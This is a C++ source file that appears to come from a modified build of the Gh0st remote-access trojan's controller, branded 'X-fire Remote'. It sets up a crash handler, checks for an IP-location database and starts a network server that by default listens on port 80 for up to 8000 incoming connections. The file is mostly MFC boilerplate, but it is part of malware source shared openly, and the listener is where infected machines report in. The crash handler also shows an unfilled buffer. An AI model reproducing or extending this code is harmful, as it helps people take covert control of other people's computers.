// gh0st.cpp : Defines the class behaviors for the application.
//

#include "stdafx.h"
#include "gh0st.h"

#include "MainFrm.h"
#include "gh0stDoc.h"
#include "gh0stView.h"
#include "resource.h"

#include "Splash.h"

#pragma comment(linker," /manifestdependency:\"type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='x86' publicKeyToken='6595b64144ccf1df' language='*'\" ")

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

void dbg_dump(struct _EXCEPTION_POINTERS* ExceptionInfo)
{
	TCHAR buff[1024];
	memset(buff, 0, sizeof(buff));

	MsgErr(_T("CRASH CODE:0x%.8x ADDR=0x%.8x FLAGS=0x%.8x PARAMS=0x%.8x\n")
		_T("eax=%.8x ebx=%.8x ecx=%.8x\nedx=%.8x esi=%.8x edi=%.8x\neip=%.8x esp=%.8x ebp=%.8x\n"),
		ExceptionInfo->ExceptionRecord->ExceptionCode,
		ExceptionInfo->ExceptionRecord->ExceptionAddress,
		ExceptionInfo->ExceptionRecord->ExceptionFlags,
		ExceptionInfo->ExceptionRecord->NumberParameters,
		ExceptionInfo->ContextRecord->Eax,
		ExceptionInfo->ContextRecord->Ebx,
		ExceptionInfo->ContextRecord->Ecx,
		ExceptionInfo->ContextRecord->Edx,
		ExceptionInfo->ContextRecord->Esi,
		ExceptionInfo->ContextRecord->Edi,
		ExceptionInfo->ContextRecord->Eip,
		ExceptionInfo->ContextRecord->Esp,
		ExceptionInfo->ContextRecord->Ebp
		);

	MessageBox(NULL, buff, _T("X-fire Remote Exception"), MB_OK);
}

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo)
{
	dbg_dump(ExceptionInfo);

	ExitProcess(0);
}
/////////////////////////////////////////////////////////////////////////////
// Cgh0stApp

BEGIN_MESSAGE_MAP(Cgh0stApp, CWinAppEx)
	//{{AFX_MSG_MAP(Cgh0stApp)
	//	ON_COMMAND(ID_APP_ABOUT, OnAppAbout)
	// NOTE - the ClassWizard will add and remove mapping macros here.
	//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
	// Standard file based document commands
	ON_COMMAND(ID_FILE_NEW, CWinAppEx::OnFileNew)
	ON_COMMAND(ID_FILE_OPEN, CWinAppEx::OnFileOpen)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// Cgh0stApp construction

Cgh0stApp::Cgh0stApp()
{
	// 初始化本进程的图像列表, 为加载系统图标列表做准备
	typedef BOOL(WINAPI * pfn_FileIconInit) (BOOL fFullInit);
	pfn_FileIconInit FileIconInit = (pfn_FileIconInit)GetProcAddress(GetModuleHandleW(L"shell32.dll"), (LPCSTR)660);
	FileIconInit(TRUE);

	//	m_bIsDisablePopTips = m_IniFile.GetInt("Settings", "PopTips", false);
	m_bIsDisablePopTips = true;

	m_pConnectView = NULL;
}

/////////////////////////////////////////////////////////////////////////////
// The one and only Cgh0stApp object

Cgh0stApp theApp;

/////////////////////////////////////////////////////////////////////////////
// Cgh0stApp initialization

BOOL Cgh0stApp::InitInstance()
{
	SetUnhandledExceptionFilter(bad_exception);

	AfxEnableControlContainer();

	// Standard initialization
	// If you are not using these features and wish to reduce the size
	//  of your final executable, you should remove from the following
	//  the specific initialization routines you do not need.

#if _MSC_VER <1300
#ifdef _AFXDLL
	Enable3dControls();			// Call this when using MFC in a shared DLL
#else
	Enable3dControlsStatic();	// Call this when linking to MFC statically
#endif
#endif

	HANDLE	hFile = CreateFileW(L"QQwry.dat", 0, 0, NULL, OPEN_EXISTING, 0, NULL);

	if (hFile != INVALID_HANDLE_VALUE)
	{
		m_bIsQQwryExist = true;
		CloseHandle(hFile);
	}
	else
	{
		//m_bIsQQwryExist = false;
		m_bIsQQwryExist = true;
	}

	CSingleDocTemplate* pDocTemplate;

	pDocTemplate = new CSingleDocTemplate(
		IDR_MAINFRAME,
		RUNTIME_CLASS(Cgh0stDoc),
		RUNTIME_CLASS(CMainFrame),       // main SDI frame window
		RUNTIME_CLASS(Cgh0stView));
	AddDocTemplate(pDocTemplate);

	// Parse command line for standard shell commands, DDE, file open
	CCommandLineInfo cmdInfo;
	ParseCommandLine(cmdInfo);

	// Dispatch commands specified on the command line
	if (!ProcessShellCommand(cmdInfo))
		return FALSE;

	m_pMainWnd->ShowWindow(SW_SHOW);
	m_pMainWnd->UpdateWindow();

	// 启动IOCP服务器
	int nPort = m_IniFile.GetInt("Settings", "ListenPort");
	if (nPort == 0) nPort = 80;

	int	nMaxConnection = m_IniFile.GetInt("Settings", "MaxConnection");

	if (nMaxConnection == 0)
	{
		nMaxConnection = 1000;
	}

	if (m_IniFile.GetInt("Settings", "MaxConnectionAuto")) nMaxConnection = 8000;

	((CMainFrame*)m_pMainWnd)->Activate(nPort, nMaxConnection);

	return TRUE;
}

BOOL Cgh0stApp::PreTranslateMessage(MSG* pMsg)
{
	// CG: The following lines were added by the Splash Screen component.
	if (CSplashWnd::PreTranslateAppMessage(pMsg))
		return TRUE;

	return CWinAppEx::PreTranslateMessage(pMsg);
}